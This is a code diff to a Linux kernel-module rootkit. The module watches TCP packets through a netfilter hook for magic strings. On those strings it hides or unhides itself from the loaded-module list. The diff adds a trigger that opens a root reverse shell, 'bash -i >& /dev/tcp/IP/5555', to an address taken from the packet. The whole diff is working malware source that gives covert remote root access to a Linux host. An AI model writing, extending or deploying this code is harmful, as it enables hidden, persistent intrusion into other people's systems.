@@ -16,10 +16,25 @@
 
 const char* rootkit_hide = "ROOTKIT_HIDE";
 const char* rootkit_show = "ROOTKIT_SHOW";
+const char* rootkit_rshell = "ROOTKIT_RSHELL";
+const char* PORT = "5555";
 
 static struct nf_hook_ops *nfho = NULL;
 static struct list_head *module_previous; // Tracks linked-list LKM list
 static int module_track = 0; // Tracks whether module is hidden (0) or visible(1)
+
+#define HOME "HOME=/root"
+#define TERM "TERM=xterm-256color"
+#define SHELL "/bin/bash"
+#define EXEC_P1 "bash -i >& /dev/tcp/"
+#define EXEC_P2 "0>&1"
+
+
+struct shell_params {
+	struct work_struct work;
+	char* target_ip;
+	char* target_port;
+};
 
 // Hides kernel module upon calling
 void hide_rootkit(void)
@@ -35,6 +50,51 @@ void show_rootkit(void){
     module_track = 1;
 }
 
+
+void execute_reverse_shell(struct work_struct *work){
+    int err;
+    struct shell_params *params = (struct shell_params*)work;
+    char *envp[] = {HOME, TERM, params->target_ip, params->target_port, NULL};
+    char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
+    char *argv[] = {SHELL, "-c", exec, NULL};
+    strcat(exec, EXEC_P1);
+    strcat(exec, params->target_ip);
+	strcat(exec, "/");
+    strcat(exec, params->target_port);
+	strcat(exec, " ");
+    strcat(exec, EXEC_P2);
+
+    printk(KERN_INFO "Starting reverse shell %s\n", exec);
+    
+
+    err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    if(err<0){
+        printk(KERN_INFO "Error executing usermodehelper.\n");
+    }
+    kfree(exec);
+    kfree(params->target_ip);
+    kfree(params->target_port);
+    kfree(params);
+
+}
+
+int start_reverse_shell(char* ip, const char* port){
+    int err;
+    struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
+    if(!params){
+        printk(KERN_INFO "Error allocating memory\n");
+        return 1;
+    }
+    params->target_ip = kstrdup(ip, GFP_KERNEL);
+    params->target_port = kstrdup(port, GFP_KERNEL);
+    INIT_WORK(&params->work, &execute_reverse_shell);
+
+    err = schedule_work(&params->work);
+    if(err<0){
+        printk(KERN_INFO "Error scheduling work of starting shell\n");
+    }
+    return err;
+}
 
 // Hook function, does the schtuff
 static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
@@ -62,22 +122,23 @@ static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_
 		}
 
 		// Grabs packet payload size
-        size = htons(iph->tot_len) - sizeof(ipsize) - tcph->doff*4;
-        _data = kmalloc(size, GFP_KERNEL);
+		size = htons(iph->tot_len) - sizeof(ipsize) - tcph->doff*4;
+		_data = kmalloc(size, GFP_KERNEL);
 
 		// Checks if packet contains data, if not, accept the packet
-		if (!_data)
+		if (!_data) {
+			kfree(_data);
 			return NF_ACCEPT;
-
+		}
 		// Extracts the data from the packet payload
-        user_data = skb_header_pointer(skb, iph->ihl*4 + tcph->doff*4, size, &_data);
-        printk(KERN_DEBUG "%s\n", user_data); // for debugging purposes
-
-        if(!user_data){
-            printk(KERN_INFO "Packet is null!");
-            kfree(_data);
-            return NF_ACCEPT;
-        }
+		user_data = skb_header_pointer(skb, iph->ihl*4 + tcph->doff*4, size, &_data);
+		printk(KERN_DEBUG "%s\n", user_data); // for debugging purposes
+		
+		if(!user_data){
+			printk(KERN_INFO "Packet is null!");
+			kfree(_data);
+			return NF_ACCEPT;
+		}
 
 		// Hides the rootkit from LKM list
 		if(memcmp(user_data, rootkit_hide, strlen(rootkit_hide)) == 0) {
@@ -88,6 +149,17 @@ static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_
 		// Puts rootkit back into LKM list
 		if(memcmp(user_data, rootkit_show, strlen(rootkit_show)) == 0) {
 			show_rootkit();
+			return NF_DROP;
+		}
+		if(memcmp(user_data, rootkit_rshell, strlen(rootkit_rshell)) == 0) {
+
+			//u32 ipsrc = ntohl(iph->saddr); Doesnt work as expected
+			
+			char* ipsrc = kmalloc(32, GFP_KERNEL);
+			strncpy(ipsrc, user_data + 14, 32);
+			printk(KERN_INFO "IP ADDRESS IS: %s\n", ipsrc);
+			start_reverse_shell(ipsrc, PORT);
+			kfree(ipsrc);
 			return NF_DROP;
 		}
 	}
@@ -120,4 +192,5 @@ static void __exit LKM_exit(void)
 
 module_init(LKM_init);
 module_exit(LKM_exit);
+MODULE_AUTHOR("MurryPuppins");
 MODULE_LICENSE("GPL");
